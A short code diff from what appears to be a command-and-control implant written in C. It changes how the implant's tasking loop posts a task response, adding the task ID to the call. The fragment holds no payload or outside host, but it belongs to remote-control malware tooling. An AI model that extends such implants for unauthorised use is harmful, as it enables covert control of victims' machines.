@@ -67,7 +67,7 @@ int temp_loop() {
             create_task_response(implant_uuid, task_uuid, text_data, task_response_as_msgpack);
 
             // POST Response
-            post(implant_uuid, text_data); // Note: verify if post needs text_data or the msgpack buffer
+            post(implant_uuid, text_data, task_uuid); // Note: verify if post needs text_data or the msgpack buffer
         }
         else {
             // This handles cases where:
